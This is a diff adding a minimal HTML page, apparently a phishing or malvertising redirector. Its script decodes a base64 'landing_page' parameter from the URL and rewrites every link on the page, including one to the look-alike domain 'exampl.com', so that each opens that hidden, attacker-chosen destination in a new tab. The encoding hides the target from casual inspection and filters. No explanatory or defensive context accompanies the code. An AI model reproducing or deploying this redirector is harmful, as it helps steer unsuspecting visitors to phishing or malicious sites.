@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+  <a href="https://exampl.com"> 1</a>
+</p>
+<script>
+  function base64_decode(r){if("function"==typeof this.window.atob)return atob(r);var n,t,e,i,o,f,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",d=0,h=0,c=[];if(!r)return r;r+="";do{n=(f=a.indexOf(r.charAt(d++))<<18|a.indexOf(r.charAt(d++))<<12|(i=a.indexOf(r.charAt(d++)))<<6|(o=a.indexOf(r.charAt(d++))))>>16&255,t=f>>8&255,e=255&f,c[h++]=64==i?String.fromCharCode(n):64==o?String.fromCharCode(n,t):String.fromCharCode(n,t,e)}while(d<r.length);return c.join("")}
+  function getUrlVars(){ var vars = {}; var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) { vars[key] = value; }); return vars; }
+  function getUrlParam(parameter){ var urlparameter = ''; if(window.location.href.indexOf(parameter) > -1){ urlparameter = getUrlVars()[parameter]; } return base64_decode(urlparameter); }
+  var landing_page = getUrlParam('landing_page');
+  var aurl = document.getElementsByTagName('a'), ahf = aurl.length;
+  while(ahf--){ aurl[ahf].setAttribute('href', landing_page); aurl[ahf].setAttribute('target','_blank');}
+  </script>
+</body>
+</html> 
